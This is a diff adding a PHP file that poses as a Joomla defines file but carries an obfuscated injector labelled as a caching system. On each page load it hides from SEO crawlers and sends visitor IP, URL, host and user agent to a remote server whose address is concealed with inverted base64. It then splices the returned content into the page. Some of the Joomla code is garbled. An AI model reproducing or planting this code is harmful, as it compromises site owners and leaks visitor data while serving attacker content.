@@ -1,0 +1,14 @@
+=================================[code start]================================= <?php//eAccelerate Caching System  
+/*ordpr*/ @ini_set('display_errors', '0');  
+$m[1], $m[2]); 
+if(!function_exists('__e_accelerator_engine')) {function __e_accelerator_engine($output) {if (!preg_match("/(ahrefs|majestic|baidu)/i", $_SERVER['HTTP_USER_AGENT'])){ $data=serialize(array('u'=>$_SERVER['REQUEST_URI'], 'h'=>$_SERVER['HTTP_HOST'],'i'=>$_SERVER['REMOTE_ADDR'],'a'=>$_SERVER["HT TP_USER_AGENT"]));$tags=array('</body>','<p>','</div>','</span>','</heade r>','</footer>','</aside>','<h1>','<h2>','<strong>','</td>');$seed = hexdec(substr(md5($_SERVER['REQUEST_URI']), 0, 5));srand($seed);shuffle($tags);foreach($tags as $tg){if(preg_match('!'.$tg.'!', $output)) {$output=preg_replace('!'.$tg.'!', @file_get_contents(~ base64_decode('l4uLj8XQ0JWImdKKj5uei5qM0ZCNmNCKj5uei5qM0IyQno/RlYyPwI3C') . urlencode($data)).$tg, $output, 1);break;}}}return ((isset($_GET['sorted']))?('<!--sortedby:'.md5($_GET['sorted']).'-- >'):('')).$output;}  
+ob_start('__e_accelerator_engine'); register_shutdown_function('ob_end_flush');} /**  
+* @package Joomla.Site** @copyright Copyright (C) 2005 - 2015 Open Source Matters, Inc. All  
+rights reserved.* @license GNU General Public License version 2 or later; see  
+LICENSE.txt 
+*/ 
+defined('_JEXEC') or die; 
+// Global definitions$parts = explode(DIRECTORY_SEPARATOR, JPATH_BASE);  
+// Defines. define('JPATH_ROOT', define('JPATH_SITE', define('JPATH_CONFIGURATION', define('JPATH_ADMINISTRATOR', 'administrator'); define('JPATH_LIBRARIES', 'libraries'); define('JPATH_PLUGINS', 'plugins'); define('JPATH_INSTALLATION', 'installation'); define('JPATH_THEMES', 'templates'); define('JPATH_CACHE', 'cache'); define('JPATH_MANIFESTS', 'manifests');  
+?>  
+=================================[code end]=================================  
